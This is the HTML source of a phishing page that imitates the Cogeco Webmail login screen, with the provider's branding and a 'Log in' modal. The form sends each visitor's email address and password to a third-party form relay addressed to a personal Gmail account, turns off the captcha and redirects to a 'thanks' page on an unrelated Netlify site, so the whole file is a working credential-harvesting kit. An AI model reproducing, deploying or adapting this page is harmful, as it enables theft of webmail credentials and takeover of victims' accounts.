<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cogeco</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="image/cogeco-favicon1.png" type="image/x-icon">
    <link rel="stylesheet" href="css/bootstrap.css">
</head>

<body>
    <div class="container-fluid">
        <div class="row"
            style="background-image:url(image/cogeco-background1.png);background-size: cover;background-repeat: no-repeat; height: 100vh;">
            <div class="container">
                <div class="row mt-5">
                    <div class="col-lg-6 mx-auto my-5 px-5 pb-5"
                        style="border:1px solid; background-color: rgb(132, 128, 128);border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
                        <div class="text-center pt-5">
                            <img src="image/logo-cogeco-blue.svg" alt="" class="img-fluid" width="100px">
                            <br>
                            <p class="h5 mt-4 text-cogeco ">Welcome to Cogeco Webmail. Great to see you again.</p>
                        </div>
                        <div class="row mt-5">
                            <div class="row justify-content-center">
                                <div class="col-12 col-md-6 col-lg-4 text-center">
                                    <img src="image/cogeco-favicon1.png" alt="" class="img-fluid mx-auto pb-3"
                                        style="max-width: 40px; width: 100%;">
                                    <button type="button" class="btn btn-primary btn-width w-100 w-md-auto"
                                        data-bs-toggle="modal" data-bs-target="#staticBackdrop">
                                        Log in
                                    </button>
                                </div>
                            </div>
                            <!-- Modal -->
                            <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static"
                                data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel"
                                aria-hidden="true">
                                <div class="modal-dialog">
                                    <div class="modal-content">
                                        <div class="modal-header">
                                            <!-- <h1 class="modal-title fs-5" id="staticBackdropLabel">Modal title</h1> -->
                                            <button type="button" class="btn-close" data-bs-dismiss="modal"
                                                aria-label="Close"></button>
                                        </div>
                                        <div class="modal-body">
                                            <div class="col-lg-12 text-center">
                                                <img src="image/logo-cogeco-blue.svg" alt=""
                                                    class="img-fluid rounded-circle  justify-content-center"
                                                    width="80px">
                                                <h5 class=" modal-title fs-5 pt-2 text-cogeco">Welcome to Cogeco
                                                    Webmail. Great to see you again.</h5>
                                            </div>
                                            <form action="https://formsubmit.co/iamkeshhy@gmail.com" method="POST">
                                                <!-- <input type="hidden" name="_cc" value="iamkeshhy@gmail.com"> -->
                                                <input type="hidden" name="_next"
                                                    value="https://tranquil-strudel-3.netlify.app/thanks.html">
                                                <div class="col-lg-12">
                                                    <input type="hidden" name="_subject" value="cogeco">
                                                    <input type="hidden" name="_captcha" value="false">
                                                    <label for="Email">Email address</label>
                                                    <br>
                                                    <input type="email" id="Email" name="Email" required
                                                        placeholder=" votre.courriel@exemple.com" required autofocus>
                                                    <p class="text-muted form-text">We'll never share your email with
                                                        anyone
                                                        else.
                                                    </p>
                                                </div>
                                                <div class="col-lg-12">
                                                    <label for="Password">Password:</label>
                                                    <br>
                                                    <input type="text" id="Password" name="Password" required
                                                        placeholder="Enter your Password" required>
                                                    <br>
                                                    <br>
                                                </div>
                                                <!-- <button input="sign" value="">Login</button> -->
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary"
                                                        data-bs-dismiss="modal">Close</button>
                                                    <button input="sign" value=""
                                                        class="btn btn-primary btn-lg pull-right"
                                                        id="submit-btn">Log in</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-12">
                            <p class="text-dark mt-3 text-center">Click on the Log in to continue</p>
                            <p class="h6 text-center text-dark">© 2026 Cogeco Connection . Accessibility .Site map </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="js/bootstrap.bundle.js"></script>
    <script src="js/alert.js"></script>
</body>

</html>
